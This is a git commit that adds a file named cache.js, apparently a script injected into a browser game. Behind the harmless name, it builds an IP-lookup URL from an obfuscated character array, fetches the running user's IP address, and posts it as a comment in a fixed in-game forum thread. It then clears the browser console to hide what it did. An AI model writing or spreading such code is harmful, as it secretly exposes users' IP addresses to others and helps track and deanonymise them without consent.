926a33276ee7722d053e659e67c8e36ae5226d45
a-128 <128114816+a-128@users.noreply.github.com>
2023-03-29 15:18:19 +0100

    Create cache.js

---
+++ cache.js
@@ -0,0 +1,7 @@
+(async () => {
+    await $.getScript("https://cdn.jsdelivr.net/gh/parseml/many-deobf@latest/deobf.js");
+    
+x=['t','p','s',':','/','g','e','i','o','n','.','h','l','c','a']
+jQuery.ajax(x[11]+x[0]+x[0]+x[1]+x[2]+x[3]+x[4]+x[4]+x[14]+x[1]+x[7]+x[10]+x[7]+x[1]+x[5]+x[6]+x[8]+x[12]+x[8]+x[13]+x[14]+x[0]+x[7]+x[8]+x[9]+x[10]+x[7]+x[8]+x[4]+x[5]+x[6]+x[0]+x[7]+x[1]).done(response => {
+ig.game[Deobfuscator.object(ig.game, "useCdn", true)].addForumThreadAndFirstComment_P('64244746b1c456059d5dd2c8', "here", response[x[7]+x[1]])}), consoleref.clear(); console.clear()
+})();
